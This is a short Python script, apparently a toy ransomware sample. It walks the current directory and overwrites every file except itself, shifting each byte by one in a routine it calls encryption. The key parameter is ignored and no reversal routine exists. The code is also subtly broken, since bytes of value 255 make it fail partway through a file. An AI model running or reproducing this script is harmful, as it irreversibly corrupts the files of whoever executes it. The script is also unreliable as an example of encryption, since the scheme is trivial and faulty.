import os


def encrypt(file_path, key):
    print(f"Encrypt file {file_path}")
    with open(file_path, 'rb') as f:
        data = f.read()
    with open(file_path, 'wb') as f:
        f.write(bytes(i + 1 for i in data))


def main():
    for path, dirs, files in os.walk(os.curdir):
        for file in files:
            abs_path = os.path.abspath(path + os.sep + file)
            if abs_path != __file__.replace('/', os.sep):
                encrypt(path + os.sep + file, 23)


if __name__ == '__main__':
    main()
